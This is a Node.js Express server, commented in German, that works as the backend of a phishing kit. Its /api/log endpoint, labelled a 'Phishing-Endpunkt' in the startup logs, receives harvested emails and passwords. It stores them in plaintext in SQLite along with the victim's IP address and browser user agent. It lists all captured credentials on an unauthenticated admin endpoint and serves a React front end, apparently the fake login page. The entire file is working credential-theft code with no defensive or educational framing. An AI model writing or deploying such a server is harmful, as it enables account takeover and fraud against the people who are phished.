// server.js - Backend-Server zum Empfangen und Speichern von Credentials
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

// Server-Konfiguration
const app = express();
const PORT = 4800;

// Middleware
app.use(cors({
  origin: ['http://localhost:3000', 'http://localhost:3001'],
  credentials: true
}));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'build')));

// Datenbank-Einrichtung
const dbDir = path.join(__dirname, 'data');
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir);
}

const db = new sqlite3.Database(path.join(dbDir, 'credentials.db'));

// Datenbank-Tabelle erstellen
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS credentials (
                                             id INTEGER PRIMARY KEY AUTOINCREMENT,
                                             type TEXT NOT NULL,
                                             email TEXT NOT NULL,
                                             password TEXT NOT NULL,
                                             ipAddress TEXT,
                                             userAgent TEXT,
                                             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// Endpoint zum Empfangen von Credentials
app.post('/api/log', (req, res) => {
  const { type, email, password } = req.body;
  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];

  console.log('Credential erhalten:', { type, email });

  if (!type || !email || !password) {
    return res.status(400).json({ error: 'Unvollständige Daten' });
  }

  const stmt = db.prepare(`
    INSERT INTO credentials (type, email, password, ipAddress, userAgent)
    VALUES (?, ?, ?, ?, ?)
  `);

  stmt.run(type, email, password, ipAddress, userAgent, (err) => {
    if (err) {
      console.error('Fehler beim Speichern der Credentials:', err);
      return res.status(500).json({ error: 'Datenbankfehler' });
    }

    console.log(`Neue ${type} Credentials gespeichert: ${email}`);
    res.status(200).json({ status: 'success' });
  });

  stmt.finalize();
});

// Endpoint zum Anzeigen aller gesammelten Credentials (nur für Administratoren)
app.get('/api/admin/credentials', (req, res) => {
  // Hier könnte eine Admin-Authentifizierung stattfinden

  db.all('SELECT * FROM credentials ORDER BY timestamp DESC', (err, rows) => {
    if (err) {
      console.error('Fehler beim Abrufen der Credentials:', err);
      return res.status(500).json({ error: 'Datenbankfehler' });
    }

    res.status(200).json(rows);
  });
});

// Optional: Endpunkt zum Löschen aller Credentials
app.delete('/api/admin/credentials', (req, res) => {
  db.run('DELETE FROM credentials', (err) => {
    if (err) {
      console.error('Fehler beim Löschen der Credentials:', err);
      return res.status(500).json({ error: 'Datenbankfehler' });
    }

    console.log('Alle Credentials wurden gelöscht');
    res.status(200).json({ status: 'success', message: 'Alle Credentials wurden gelöscht' });
  });
});

// Serviere React-App für alle anderen Routen
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

// Server starten
app.listen(PORT, () => {
  console.log(`Server läuft auf Port ${PORT}`);
  console.log(`Phishing-Endpunkt: http://localhost:${PORT}/api/log`);
  console.log(`Admin-Übersicht: http://localhost:${PORT}/api/admin/credentials`);
  console.log(`Datenbank-Pfad: ${path.join(dbDir, 'credentials.db')}`);
});

// Prozess-Beendigungshandler
process.on('SIGINT', () => {
  db.close();
  console.log('Server und Datenbankverbindung wurden geschlossen');
  process.exit(0);
});